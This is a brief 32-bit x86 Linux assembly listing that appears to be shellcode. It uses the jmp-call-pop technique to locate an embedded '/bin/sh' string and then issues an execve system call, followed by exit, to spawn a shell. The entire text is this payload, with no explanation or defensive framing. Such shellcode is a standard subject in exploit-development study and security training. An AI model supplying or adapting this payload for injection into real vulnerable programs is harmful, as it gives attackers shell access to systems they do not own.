
section .text

bits 32

global _start

_start:

	jmp short sh
sc:	
	mov ecx,esp
	pop ebx
	xor eax,eax
	mov [esp+4],eax
	mov [esp+8],eax
	mov [ebx+7], eax
	mov dl,0xb
	mov al,dl
	lea edx, [ebx+7]
	int 80h
	xor ebx,ebx
	mov eax,ebx
	inc eax
	int 80h
sh:
	call sc
	db "/bin/sh",0x0